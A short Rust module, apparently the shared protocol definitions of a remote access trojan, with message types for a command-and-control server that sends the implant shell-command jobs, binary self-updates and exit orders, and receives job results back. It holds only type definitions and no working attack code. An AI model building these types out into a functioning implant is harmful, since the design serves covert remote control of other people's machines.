// pub mod ssl_utils;
pub mod user_agent;
pub mod utils;

pub use user_agent::UserAgent;

use serde::{Deserialize, Serialize};

// CC -> RAT
#[derive(Deserialize, Serialize, Debug, Clone)]
pub enum Message {
    BananaBread,
    Job { id: i32, task: Task },
    Update(Vec<u8>),
    Exit,
}

// RAT -> CC
#[derive(Deserialize, Serialize, Debug, Clone)]
pub enum Notification {
    Empty,
    StartingJob(i32),
    Result {
        job_id: i32,
        completed_at: chrono::DateTime<chrono::Utc>,
        result: Result<String, String>,
    },
}

#[derive(Deserialize, Serialize, Debug, Clone)]
#[serde(tag = "type")]
pub enum Task {
    // WebAssembly { wasm: Vec<u8>, fn_name: String },
    Command { command: String },
}
